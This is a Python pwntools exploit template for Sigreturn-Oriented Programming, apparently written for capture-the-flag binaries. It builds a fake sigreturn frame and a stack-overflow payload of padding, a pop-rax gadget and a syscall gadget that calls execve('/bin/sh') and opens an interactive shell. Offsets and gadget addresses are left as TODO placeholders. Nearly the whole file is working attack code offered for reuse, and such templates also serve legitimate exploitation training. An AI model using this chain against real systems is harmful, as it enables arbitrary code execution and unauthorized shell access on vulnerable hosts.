#!/usr/bin/env python3
"""
Sigreturn-Oriented Programming (SROP) Template
Works when: only a 'syscall; ret' gadget exists, no pop-rdi/rsi gadgets.
Core idea: sigreturn syscall (rax=0xf) restores ALL registers from a
fake sigcontext frame on the stack — we control rip, rdi, rsi, rdx, etc.

Requirements:
- A 'syscall; ret' (or 'syscall') gadget in the binary
- Ability to set rax=0xf (usually via write() return value: write(1, buf, 0xf))
- Stack overflow or arbitrary write to plant the fake frame

Usage: Copy, fill in TODO sections, adjust for your challenge.
"""
from pwn import *
import sys

# ── Target configuration ──────────────────────────────────────────────────────
BINARY  = "./srop_challenge"   # TODO: path to binary
LIBC    = "./libc.so.6"        # TODO: path to libc (or auto-detect)
HOST    = "target.ctf.io"
PORT    = 1337

context.binary = elf = ELF(BINARY)
try:
    libc = ELF(LIBC)
except Exception:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"

# ── Exploit parameters (fill from analysis) ───────────────────────────────────
OFFSET      = 0       # TODO: offset to return address (use cyclic_offset)
SYSCALL_RET = 0x0     # TODO: address of 'syscall ; ret' gadget (find_gadget)

# ── Helper: find /bin/sh in the binary or libc ───────────────────────────────
def binsh_addr(elf_or_libc: ELF) -> int:
    return next(elf_or_libc.search(b"/bin/sh\x00"), 0)

# ── Stage 1: set rax = 0xf using write() trick ───────────────────────────────
#
# Strategy A (most common): write(fd, buf, 0xf) returns 0xf = sigreturn syscall number
#   send padding → call write(1, writable, 15) → then fall through to 'syscall; ret'
#
# Strategy B: binary has a gadget like 'pop rax; ret' or 'mov rax, N; ret'
#
# Strategy C: controlled loop counter that naturally hits 0xf

def build_srop_frame(syscall_num: int, rip: int,
                     rdi: int = 0, rsi: int = 0,
                     rdx: int = 0, rsp: int = 0) -> SigreturnFrame:
    """Build a sigreturn frame targeting syscall_num at rip with given regs."""
    frame = SigreturnFrame()
    frame.rax = syscall_num   # syscall number in the new context
    frame.rip = rip           # address to execute (e.g. syscall gadget again)
    frame.rdi = rdi
    frame.rsi = rsi
    frame.rdx = rdx
    if rsp:
        frame.rsp = rsp
    # Segment registers (needed for kernel to accept the frame)
    frame.cs  = 0x33   # user-mode 64-bit code segment
    frame.ss  = 0x2b   # user-mode stack segment
    frame.rflags = 0x200  # IF flag (enable interrupts)
    return frame


def main():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(elf.path)

    # ── Step 1: leak writable address (if needed for /bin/sh string) ──────────
    # Most challenges: /bin/sh is already in libc or binary; skip if so.
    #
    # If you need to plant /bin/sh:
    #   writable = elf.bss() + 0x400
    #   ... use a read/write primitive to write b"/bin/sh\x00" there ...

    # ── Step 2: SROP to execve('/bin/sh', NULL, NULL) ─────────────────────────
    #
    # We need: rax=0x3b (execve), rip=syscall_gadget, rdi=/bin/sh_ptr, rsi=0, rdx=0
    #
    # Option A: /bin/sh in libc — need libc base leak first
    # libc_base = <leaked> - libc.sym['puts']
    # binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    #
    # Option B: plant /bin/sh in writable memory (see Step 1 above)

    binsh = binsh_addr(elf) or binsh_addr(libc)
    if not binsh:
        log.warning("/bin/sh not found in binary or libc — plant it manually")
        binsh = elf.bss() + 0x400  # placeholder; write b"/bin/sh\x00" here first

    # Build execve frame
    execve_frame = build_srop_frame(
        syscall_num = 0x3b,         # execve syscall number (x86_64)
        rip         = SYSCALL_RET,  # execute syscall again after frame restoration
        rdi         = binsh,        # arg1: pathname "/bin/sh"
        rsi         = 0,            # arg2: argv = NULL
        rdx         = 0,            # arg3: envp = NULL
    )

    log.info(f"syscall;ret gadget @ {SYSCALL_RET:#x}")
    log.info(f"/bin/sh @ {binsh:#x}")

    # ── Step 3: Trigger sigreturn ─────────────────────────────────────────────
    #
    # Method A: write() return trick
    #   - call write(1, buf, 0xf) — returns 0xf into rax
    #   - then fall to 'syscall; ret' → sigreturn syscall
    #   - frame is at [rsp] = execve_frame
    #
    # Method B: pop rax directly
    #   rop = ROP(elf)
    #   rop.raw(pop_rax)
    #   rop.raw(0xf)        # sigreturn
    #   rop.raw(SYSCALL_RET)
    #   rop.raw(bytes(execve_frame))

    # TODO: construct your actual overflow/write that delivers the frame.
    # Below is a generic template assuming a simple stack overflow:

    padding = OFFSET * b"A"

    # Minimal chain: set rax=0xf then syscall, frame follows on stack
    # Requires: pop_rax gadget. If not available, use write() trick.
    POP_RAX = 0x0  # TODO: fill with find_gadget(binary, 'pop rax; ret')

    if POP_RAX:
        payload = (
            padding
            + p64(POP_RAX)
            + p64(0xf)           # rax = sigreturn
            + p64(SYSCALL_RET)   # trigger sigreturn
            + bytes(execve_frame)
        )
    else:
        # write() trick: write(1, frame_addr, 15) fills rax=0xf
        # Assumes binary has write@plt and the frame is planted below
        frame_addr = elf.bss() + 0x200
        # TODO: write execve_frame to frame_addr first, then:
        log.warning("POP_RAX not found — use write() trick or plant frame manually")
        payload = padding  # placeholder

    io.sendlineafter(b"> ", payload)
    io.interactive()


if __name__ == "__main__":
    main()
